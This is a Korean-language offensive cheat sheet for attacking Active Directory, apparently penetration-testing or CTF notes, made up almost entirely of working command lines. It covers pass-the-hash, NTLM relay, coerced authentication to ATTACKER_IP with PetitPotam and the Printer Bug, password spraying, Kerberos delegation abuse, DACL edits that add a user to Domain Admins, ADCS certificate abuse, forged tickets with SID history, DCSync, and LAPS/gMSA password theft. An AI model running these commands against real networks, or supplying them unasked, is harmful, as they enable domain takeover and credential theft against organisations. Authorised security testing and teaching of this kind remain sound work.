# Active Directory

---

## Kerberos 인증 설정

```bash
# /etc/krb5.conf
[libdefaults]
    default_realm = DOMAIN.LOCAL
[realms]
    DOMAIN.LOCAL = { kdc = DC_IP }

# 시간 동기화
ntpdate DC_IP

# /etc/hosts 추가
echo "DC_IP dc.domain.local" >> /etc/hosts
```

## 인증 방식별 명령어

```bash
# 비밀번호
impacket-psexec DOMAIN/USER:'PASS'@IP
nxc smb IP -u USER -p PASS

# NTLM 해시
impacket-psexec USER@IP -hashes :NTHASH
nxc smb IP -u USER -H NTHASH
evil-winrm -i IP -u USER -H NTHASH

# Kerberos 티켓
export KRB5CCNAME=ticket.ccache
impacket-psexec DOMAIN/USER@FQDN -k -no-pass
nxc smb FQDN --use-kcache
```

## 인증 공격

### Overpass-the-Hash

```bash
impacket-getTGT DOMAIN/USER -hashes :NTHASH -dc-ip DC_IP
impacket-getTGT DOMAIN/USER -aesKey AES_KEY -dc-ip DC_IP  # OPSEC 향상
```

### NTLM Relay

```bash
# Relay 대상 확인 (SMB Signing off)
nxc smb SUBNET/24 --gen-relay-list targets.txt

# SMB Relay
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# LDAP Relay → RBCD
impacket-ntlmrelayx -t ldap://DC_IP --delegate-access

# LDAP Relay → Shadow Credentials
impacket-ntlmrelayx -t ldap://DC_IP --shadow-credentials --shadow-target TARGET$

# LDAP Relay → DACL
impacket-ntlmrelayx -t ldap://DC_IP --escalate-user USER

# 강제 인증 유발
python3 PetitPotam.py ATTACKER_IP TARGET_IP
python3 Coercer.py -u USER -p PASS -d DOMAIN -l ATTACKER_IP -t TARGET_IP
python3 printerbug.py DOMAIN/USER:PASS@TARGET ATTACKER_IP          # Printer Bug
```

### Password Spray

```bash
# AD 잠금 정책 확인
nxc smb DC -u USER -p PASS --pass-pol

# Spray (잠금 주의)
nxc smb DC -u users.txt -p 'Season2024!' --continue-on-success
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Season2024!'

# 일반적인 패턴
# Season + Year (+ !)
# Company + Year
# Password + Number + !
```

## Kerberos Delegation

```bash
# 위임 설정 확인
impacket-findDelegation DOMAIN/USER:PASS -dc-ip DC_IP

# Constrained Delegation (S4U)
impacket-getST DOMAIN/SVC:PASS -spn TARGET_SPN -impersonate Administrator -dc-ip DC_IP
# Bronze Bit (CVE-2020-17049) — forwardable 제한 우회
impacket-getST ... -force-forwardable

# RBCD
impacket-addcomputer DOMAIN/USER:PASS -computer-name 'FAKE$' -computer-pass 'Pass!' -dc-ip DC_IP
impacket-rbcd DOMAIN/USER:PASS -dc-ip DC_IP -action write -delegate-to 'TARGET$' -delegate-from 'FAKE$'
impacket-getST DOMAIN/'FAKE$':'Pass!' -spn cifs/TARGET_FQDN -impersonate Administrator -dc-ip DC_IP
```

## DACL 남용

```bash
bloodyAD -d DOMAIN -u USER -p PASS --host DC set password TARGET 'NewPass!'
bloodyAD -d DOMAIN -u USER -p PASS --host DC add genericAll TARGET USER
bloodyAD -d DOMAIN -u USER -p PASS --host DC add groupMember "Domain Admins" USER
impacket-dacledit -action write -rights DCSync DOMAIN/USER:PASS -dc-ip DC_IP
impacket-owneredit -action write -new-owner USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
```

## ADCS

```bash
# 취약 템플릿 탐색
certipy find -vulnerable -u USER@DOMAIN -p PASS -dc-ip DC_IP -stdout
```

### ESC 요약

| ESC | 조건 | 공격 |
|-----|------|------|
| ESC1 | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + 낮은 권한 등록 | SAN에 admin UPN 지정 |
| ESC2 | Any Purpose EKU + 낮은 권한 등록 | 임의 인증서 발급 |
| ESC3 | Certificate Request Agent EKU | 대리 등록 |
| ESC4 | 템플릿 ACL 수정 가능 | ESC1 조건으로 변경 |
| ESC6 | CA에 EDITF_ATTRIBUTESUBJECTALTNAME2 | 모든 요청에 SAN 추가 |
| ESC7 | CA에 ManageCA 권한 | ESC6 플래그 활성화 |
| ESC8 | HTTP 엔드포인트 + NTLM Relay | HTTP→CA relay |
| ESC9 | GenericWrite + CT_FLAG_NO_SECURITY_EXTENSION | UPN 변경 후 인증 |
| ESC11 | ICertPassage RPC + NTLM Relay | DCOM relay |
| ESC13 | Issuance Policy + Group Linked | OID 그룹 접근 |

```bash
# ESC1 (SAN 지정)
certipy req -u USER@DOMAIN -p PASS -ca CA -template TMPL \
  -upn administrator@DOMAIN -target DC

# ESC4 (템플릿 ACL 수정 → ESC1 조건으로)
certipy template -u USER@DOMAIN -p PASS -template TMPL -save-old -target DC_IP

# ESC8 (HTTP Relay)
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController

# ESC6/ESC7 (CA 설정 악용)
certipy ca -u USER@DOMAIN -p PASS -ca CA -enable-template SubCA
certipy req -u USER@DOMAIN -p PASS -ca CA -template SubCA -upn admin@DOMAIN

# 인증서 인증 → NTLM 해시
certipy auth -pfx admin.pfx -domain DOMAIN
```

## Domain Trust

```bash
# Trust 열거
nltest /trusted_domains
Get-DomainTrust
Get-ForestTrust

# 자식→부모 도메인 (SID History)
# 1. 자식 도메인 krbtgt Hash + 부모 도메인 SID 필요
impacket-lookupsid DOMAIN/USER:PASS@PARENT_DC
# 2. Enterprise Admins SID = ParentDomainSID-519
impacket-ticketer -nthash KRBTGT_HASH -domain CHILD.DOMAIN -domain-sid CHILD_SID \
  -extra-sid PARENT_SID-519 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec CHILD.DOMAIN/Administrator@PARENT_DC -k -no-pass
```

## Unconstrained Delegation

```bash
# 열거
Get-DomainComputer -Unconstrained
nxc ldap DC -u USER -p PASS -M find-delegation

# 강제 인증 유발 후 티켓 캡처
.\Rubeus.exe monitor /interval:5 /nowrap
python3 PetitPotam.py UNCONSTRAINED_HOST DC_IP
# 또는 Printer Bug
python3 SpoolSample.py DC_IP UNCONSTRAINED_HOST

# 캡처된 DC TGT로 DCSync
.\Rubeus.exe ptt /ticket:BASE64_TICKET
impacket-secretsdump DOMAIN/DC\$@DC_IP -k -no-pass
```

## 환경 체크리스트

| 항목 | 확인 명령어 | 공격 영향 |
|------|-----------|----------|
| SMB Signing | `nxc smb IP` (signing:True/False) | False → NTLM Relay 가능 |
| LDAP Signing | `nxc ldap DC -M ldap-checker` | 미설정 → LDAP Relay 가능 |
| MAQ | `nxc ldap DC -u USER -p PASS -M maq` | >0 → RBCD 공격 가능 |
| LAPS | `nxc ldap DC -u USER -p PASS -M laps` | 있으면 로컬 admin 비밀번호 유출 |
| gMSA | `nxc ldap DC -u USER -p PASS -M gmsa` | 서비스 계정 비밀번호 읽기 |
| Protected Users | `Get-DomainGroupMember "Protected Users"` | 멤버는 NTLM/Delegation 불가 |

### LAPS / gMSA 읽기

```bash
# LAPS 비밀번호 읽기
nxc ldap DC -u USER -p PASS -M laps
# PowerView
Get-DomainComputer -Identity TARGET -Properties ms-mcs-admpwd

# gMSA 비밀번호 읽기
nxc ldap DC -u USER -p PASS -M gmsa
# Python
python3 gMSADumper.py -u USER -p PASS -d DOMAIN
```

## 열거

```bash
# BloodHound
bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c all

# PowerView (Windows)
Import-Module .\PowerView.ps1
Get-DomainUser -SPN                           # Kerberoastable
Get-DomainUser -PreauthNotRequired            # AS-REP Roastable
Find-InterestingDomainAcl -ResolveGUIDs       # 악용 가능 ACL
Find-LocalAdminAccess                         # 로컬 관리자 접근
Get-DomainComputer -Unconstrained             # Unconstrained Delegation
Get-DomainGPO | select displayname, gpcfilesyspath
Get-DomainObjectAcl -Identity TARGET -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# AD 모듈 (Windows)
Get-ADUser -Filter * -Properties Description | ? {$_.Description -ne $null}
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADGroupMember "Domain Admins" -Recursive
Get-ADComputer -Filter * -Properties OperatingSystem | select Name, OperatingSystem

# ForeignSecurityPrincipals (외부 트러스트)
Get-DomainForeignGroupMember -Domain DOMAIN

# BloodHound Cypher 쿼리
# 최단 DA 경로
MATCH p=shortestPath((u:User)-[*1..]->(g:Group)) WHERE g.name =~ "DOMAIN ADMINS@.*" RETURN p
# Kerberoastable → DA
MATCH (u:User {hasspn:true}), (g:Group), p=shortestPath((u)-[*1..]->(g)) WHERE g.name =~ "DOMAIN ADMINS@.*" RETURN p
```
